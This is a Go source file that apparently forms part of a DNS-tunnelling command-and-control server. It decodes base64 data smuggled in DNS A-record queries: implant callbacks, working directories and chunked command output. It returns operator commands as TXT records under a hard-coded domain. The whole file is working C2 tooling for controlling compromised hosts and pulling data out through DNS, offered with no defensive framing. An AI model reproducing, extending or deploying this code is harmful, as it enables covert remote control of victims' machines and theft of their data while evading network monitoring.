package completion

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"strconv"
	"strings"
	"sync"

	"github.com/miekg/dns"
)

var msgcache = map[int]string{}
var msgcacheMutex = sync.RWMutex{}

func parseQuery(m *dns.Msg) {
	for _, q := range m.Question {
		switch q.Qtype {
		case dns.TypeA:
			if !lineCacheCheck(Base64Encode(q.Name)) {
				sub := strings.Split(q.Name, ".")
				if sub[1] == "working" {
					currentDir = Base64Decode(sub[0] + "==")
				} else if sub[1] == "current" {
					curcmd = sub[0]
				} else if sub[1] == "host" {
					if !connectionExist(sub[2]) {
						AddConnection(sub[2])
						sessionID = sub[2]
						fmt.Println("\nNew callback: " + Base64Decode(sub[0]) + ":" + sub[2])
					}

				} else {
					parts := strings.Split(sub[0], "-")
					if len(parts) > 2 {
						if parts[0] == "0" {
							fmt.Print("\n" + Base64Decode(parts[2]+"==") + "\n")
						} else {
							if parts[1] == "0" {
								fmt.Println()
							}
							intVar1, _ := strconv.Atoi(parts[1])
							addMsg(intVar1, Base64Decode(parts[2]+"=="))
							intVar, _ := strconv.Atoi(parts[0])
							if len(msgcache) == intVar {
								msgcacheMutex.RLock()

								send(msgcache)

								msgcacheMutex.RUnlock()

								//Clear Cache
								msgcache = map[int]string{}
							}
						}
						lineCache(Base64Encode(q.Name))
					}
				}
			}
		case dns.TypeTXT:
			ip := records[q.Name]
			if ip != "" {
				rr, err := dns.NewRR(fmt.Sprintf("%s TXT %s", q.Name, ip))
				if err == nil {
					m.Answer = append(m.Answer, rr)
				}
			}
		}
	}
}

func send(msg map[int]string) {
	messages <- msg
}

func HandleDnsRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = true

	switch r.Opcode {
	case dns.OpcodeQuery:
		parseQuery(m)
	}

	w.WriteMsg(m)
}

func Base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func Base64Decode(str string) string {
	data, _ := base64.StdEncoding.DecodeString(str)
	return string(data)
}

func AddTXTRecord(r string) {
	records[curcmd+"."+csessionID+".cmd.dns.gostripe.click."] = r
}

func addMsg(loc int, m string) {
	msgcacheMutex.Lock()
	msgcache[loc] = m
	msgcacheMutex.Unlock()
}

func lineCache(line string) {

	linecache = append(linecache, line)
}

func AddConnection(h string) {

	connectedHosts = append(connectedHosts, h)
}

func lineCacheCheck(cmd string) bool {
	return contains(linecache, cmd)
}

func connectionExist(h string) bool {
	return contains(connectedHosts, h)
}

func contains(s []string, str string) bool {
	for _, v := range s {
		if v == str {
			return true
		}
	}

	return false
}

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
